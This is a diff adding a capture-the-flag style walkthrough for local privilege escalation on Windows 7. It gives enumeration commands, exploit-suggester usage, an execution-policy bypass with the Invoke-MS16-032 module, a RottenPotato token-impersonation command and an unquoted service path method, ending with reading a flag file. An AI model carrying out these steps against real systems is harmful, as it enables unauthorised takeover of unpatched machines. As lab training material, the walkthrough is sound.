@@ -4045,3 +4045,161 @@ type C:\Users\Administrator\Desktop\flag.txt
 ---
 
 
+
+# 🧰 Windows 7 Privilege Escalation 
+
+### 📌 Overview
+
+Windows 7 reached end-of-life on **January 14, 2020**, yet it is still widely used across education, retail, healthcare, finance, and government sectors.
+EOL systems lack modern mitigations such as:
+
+* Credential Guard
+* Device Guard / Code Integrity
+* AppLocker enforcement
+* Control Flow Guard
+
+These systems are highly vulnerable to **local privilege escalation (LPE)** via unpatched kernel exploits, service misconfigurations, or token impersonation.
+
+## 1. 🕵️ Enumeration
+
+### 1.1 System Information
+
+```cmd
+systeminfo
+whoami /priv
+whoami /groups
+net users
+net localgroup administrators
+hostname
+```
+
+* Capture output to `systeminfo.txt` for Windows-Exploit-Suggester.
+
+
+### 1.2 Patch Level / Vulnerability Assessment
+
+#### Using Windows-Exploit-Suggester
+
+1. Update local MS vulnerability database:
+
+```bash
+sudo python2.7 windows-exploit-suggester.py --update
+```
+
+2. Run against captured `systeminfo.txt`:
+
+```bash
+python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
+```
+
+#### Example Output Highlights
+
+| Exploit  | Type | Notes                                                 |
+| -------- | ---- | ----------------------------------------------------- |
+| MS16-032 | [E]  | Secondary Logon Handle LPE – Works on Windows 7 x64   |
+| MS16-075 | [M]  | RottenPotato / Hot Potato – SMB token impersonation   |
+| MS16-135 | [E]  | Win32k kernel – PoC & RCE available                   |
+| MS16-074 | [E]  | GDI32/ATMFD Heap Corruption – DoS / Memory Disclosure |
+| MS16-063 | [E]  | IE 11 PoC – Memory corruption                         |
+
+> `[E]` = Exploit code available; `[M]` = Metasploit module available
+
+
+### 1.3 Metasploit Local Exploit Suggester
+
+If Meterpreter shell is available:
+
+```msf
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+```
+
+* Helps identify LPE modules for quick testing.
+
+
+
+## 2. 📡 Initial Access
+
+Assume a Meterpreter reverse shell is obtained via:
+
+* SMB delivery / PSExec / RDP exploit
+* Phishing / social engineering
+* Exploiting vulnerable service
+
+
+
+## 3. 🚀 Privilege Escalation Methods
+
+### **Method 1 – MS16-032 (Secondary Logon Handle LPE)**
+
+1. Set execution policy in PowerShell:
+
+```powershell
+Set-ExecutionPolicy Bypass -Scope Process -Force
+```
+
+2. Import PoC module:
+
+```powershell
+Import-Module .\Invoke-MS16-032.ps1
+```
+
+3. Execute exploit:
+
+```powershell
+Invoke-MS16-032
+```
+
+4. Verify elevated shell:
+
+```cmd
+whoami
+# nt authority\system
+```
+
+### **Method 2 – MS16-075 / HotPotato / RottenPotato**
+
+* Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.
+* Token impersonation to SYSTEM:
+
+```cmd
+RottenPotato.exe -t * -p cmd.exe -l 9999
+```
+
+
+
+### **Method 3 – Kernel Exploits (MS16-135 / Win32k)**
+
+* Win32k kernel vulnerabilities allow arbitrary code execution.
+* May require Metasploit or compiled PoC.
+
+
+### **Method 4 – Misconfigured Services / Unquoted Paths**
+
+* Check:
+
+```cmd
+wmic service get name,pathname,startmode
+```
+
+* Place executable in writable path → restart service → SYSTEM shell.
+
+## 4. 🏁 Post-Exploitation
+
+### 4.1 Validate SYSTEM Privileges
+
+```cmd
+whoami
+whoami /groups
+```
+
+### 4.2 Capture Flag
+
+```cmd
+type C:\Users\Administrator\Desktop\flag.txt
+```
+
+---
+
+
